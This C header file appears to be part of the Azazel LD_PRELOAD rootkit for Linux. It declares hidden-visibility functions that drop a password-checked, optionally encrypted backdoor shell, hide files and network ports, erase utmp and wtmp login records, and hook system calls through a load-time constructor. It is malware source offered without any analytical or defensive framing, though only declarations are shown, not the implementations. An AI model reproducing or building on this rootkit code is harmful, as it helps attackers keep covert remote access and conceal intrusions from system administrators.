#ifndef AZAZEL_H
#define AZAZEL_H

#include <sys/socket.h>
#include "const.h"

static void init (void) __attribute__ ((constructor));

// No need to leak extra function visibility 
void azazel_init(void) __attribute__((visibility("hidden")));
void cleanup(void *var, int len) __attribute__((visibility("hidden")));
int drop_shell(int sock, struct sockaddr *addr) __attribute__((visibility("hidden")));
int is_invisible(const char *path) __attribute__((visibility("hidden")));
int is_procnet(const char *filename) __attribute__((visibility("hidden")));
int check_shell_password(int sock, int crypt) __attribute__((visibility("hidden")));
void setup_pty(int sock, int *pty, int *tty) __attribute__((visibility("hidden")));
void shell_loop(int sock, int pty, int crypt) __attribute__((visibility("hidden")));
void clean_utmp(char *pts, int verbose) __attribute__((visibility("hidden")));
void clean_wtmp(char *pts, int verbose) __attribute__((visibility("hidden")));
int parse_environ(char *stack, int len, char *needle) __attribute__((visibility("hidden")));
int is_owner(void) __attribute__((visibility("hidden")));

FILE *hide_ports(const char *filename) __attribute__((visibility("hidden")));
ssize_t read_next_line(int fd, void *buf, size_t count) __attribute__((visibility("hidden")));

typedef struct struct_syscalls {
	char syscall_name[51];
	void *(*syscall_func)();
} s_syscalls;

s_syscalls syscall_list[SYSCALL_SIZE];

struct linux_dirent {
	long			d_ino;
	off_t			d_off;
	unsigned short	d_reclen;
	char			d_name[];
};


#define CRYPT_SHELL 1
#define PLAIN_SHELL 0

#define O_RDWR 02
#define O_RDONLY 00

static int constr = 0;

#endif
